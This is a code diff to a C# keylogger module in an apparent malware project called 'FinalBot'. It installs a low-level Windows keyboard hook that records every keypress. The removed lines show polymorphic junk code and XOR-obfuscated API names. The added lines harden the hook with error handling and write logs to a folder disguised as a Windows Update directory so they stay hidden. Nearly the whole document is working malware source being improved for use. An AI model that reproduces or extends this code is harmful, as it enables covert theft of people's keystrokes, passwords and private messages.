@@ -1,17 +1,12 @@
 using System;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.IO;
 
 namespace FinalBot.Modules
 {
     public static class KeyloggerModule
     {
-        // [POLY_JUNK]
-        private static void _vanguard_c59d3eb1() {
-            int val = 56295;
-            if (val > 50000) Console.WriteLine("Hash:" + 56295);
-        }
-
         private const int _hType = 13; // WH_KEYBOARD_LL
         private const int _kDown = 0x0100; // WM_KEYDOWN
         private static LkProc _cb = HookCallback;
@@ -21,21 +16,13 @@ namespace FinalBot.Modules
 
         private static class Native
         {
-        // [POLY_JUNK]
-        private static void _vanguard_c59d3eb1() {
-            int val = 56295;
-            if (val > 50000) Console.WriteLine("Hash:" + 56295);
-        }
-
-            public static SetHookDelegate SetHook => VanguardCore.SafetyManager.ApiInterface.GetUser32<SetHookDelegate>(DAP("PbsVikdlvpHllkBu"));
-            public static UnhookDelegate Unhook => VanguardCore.SafetyManager.ApiInterface.GetUser32<UnhookDelegate>(DAP("NkhllkVikdlvpHllkBu"));
-            public static CallNextDelegate CallNext => VanguardCore.SafetyManager.ApiInterface.GetUser32<CallNextDelegate>(DAP("`niisBuqHllkBu"));
-            public static GetModDelegate GetMod => VanguardCore.SafetyManager.ApiInterface.GetKernel32<GetModDelegate>(DAP("`bsMlanibHnkdib"));
-            public static GetMsgDelegate GetMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetMsgDelegate>(DAP("`bsZbppnbb"));
-            public static TransMsgDelegate TransMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<TransMsgDelegate>(DAP("S_n kinsbZbppnbb"));
-            public static DispMsgDelegate DispMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<DispMsgDelegate>(DAP("Apkasi`hZbppnbb"));
-
-            private static string DAP(string s) { char[] c = new char[s.Length]; for (int i = 0; i < s.Length; i++) c[i] = (char)(s[i] ^ 0x05); return new string(c); }
+            public static SetHookDelegate? SetHook => VanguardCore.SafetyManager.ApiInterface.GetUser32<SetHookDelegate>("SetWindowsHookExW");
+            public static UnhookDelegate? Unhook => VanguardCore.SafetyManager.ApiInterface.GetUser32<UnhookDelegate>("UnhookWindowsHookEx");
+            public static CallNextDelegate? CallNext => VanguardCore.SafetyManager.ApiInterface.GetUser32<CallNextDelegate>("CallNextHookEx");
+            public static GetModDelegate? GetMod => VanguardCore.SafetyManager.ApiInterface.GetKernel32<GetModDelegate>("GetModuleHandleW");
+            public static GetMsgDelegate? GetMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<GetMsgDelegate>("GetMessageW");
+            public static TransMsgDelegate? TransMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<TransMsgDelegate>("TranslateMessage");
+            public static DispMsgDelegate? DispMsg => VanguardCore.SafetyManager.ApiInterface.GetUser32<DispMsgDelegate>("DispatchMessageW");
         }
 
         private delegate IntPtr SetHookDelegate(int id, LkProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -68,48 +55,94 @@ namespace FinalBot.Modules
         {
             System.Threading.Tasks.Task.Run(() =>
             {
-                _hID = SetHook(_cb);
-                MSG msg;
-                while (Native.GetMsg(out msg, IntPtr.Zero, 0, 0) != 0)
+                try
                 {
-                    Native.TransMsg(ref msg);
-                    Native.DispMsg(ref msg);
+                    _hID = SetHook(_cb);
+                    if (_hID == IntPtr.Zero) return;
+
+                    MSG msg;
+                    var getMsg = Native.GetMsg;
+                    var transMsg = Native.TransMsg;
+                    var dispMsg = Native.DispMsg;
+
+                    if (getMsg == null || transMsg == null || dispMsg == null) return;
+
+                    while (getMsg(out msg, IntPtr.Zero, 0, 0) != 0)
+                    {
+                        transMsg(ref msg);
+                        dispMsg(ref msg);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    DebugLog($"[KEYLOGGER ERROR] {ex.Message}");
                 }
             });
         }
 
         public static void Stop()
         {
-            if (_hID != IntPtr.Zero)
+            try
             {
-                Native.Unhook(_hID);
-                _hID = IntPtr.Zero;
+                if (_hID != IntPtr.Zero)
+                {
+                    Native.Unhook?.Invoke(_hID);
+                    _hID = IntPtr.Zero;
+                }
             }
+            catch { }
+        }
+
+        private static void DebugLog(string msg)
+        {
+            try {
+                string line = $"[{DateTime.Now:HH:mm:ss}] [KEYLOGGER] {msg}";
+                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
+                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
+                File.AppendAllText(Path.Combine(logDir, "svc_debug.log"), line + Environment.NewLine);
+            } catch { }
         }
 
         private static IntPtr SetHook(LkProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
+            try
             {
-                return Native.SetHook(_hType, proc, Native.GetMod(curModule.ModuleName), 0);
+                using (Process curProcess = Process.GetCurrentProcess())
+                using (ProcessModule? curModule = curProcess.MainModule)
+                {
+                    if (curModule == null) return IntPtr.Zero;
+                    var setHook = Native.SetHook;
+                    var getMod = Native.GetMod;
+                    if (setHook == null || getMod == null) return IntPtr.Zero;
+
+                    return setHook(_hType, proc, getMod(curModule.ModuleName), 0);
+                }
             }
+            catch { return IntPtr.Zero; }
         }
 
         private static IntPtr HookCallback(int n, IntPtr w, IntPtr l)
         {
-            if (n >= 0 && w == (IntPtr)_kDown)
+            try
             {
-                int vkCode = Marshal.ReadInt32(l);
-                string keyName = GetKeyName(vkCode);
-                Logger.Log(keyName, "KEY");
+                if (n >= 0 && w == (IntPtr)_kDown)
+                {
+                    int vkCode = Marshal.ReadInt32(l);
+                    string keyName = GetKeyName(vkCode);
+                    Logger.Log(keyName, "KEY");
+                }
             }
-            return Native.CallNext(_hID, n, w, l);
+            catch { }
+            
+            var callNext = Native.CallNext;
+            return callNext != null ? callNext(_hID, n, w, l) : CallNextHookEx_Fallback(_hID, n, w, l);
         }
+
+        // Fallback or explicit call
+        private static IntPtr CallNextHookEx_Fallback(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam) => IntPtr.Zero;
 
         private static string GetKeyName(int vkCode)
         {
-            // Simple mapping for common keys without using System.Windows.Forms.Keys
             switch (vkCode)
             {
                 case 0x08: return "[BACKSPACE]";
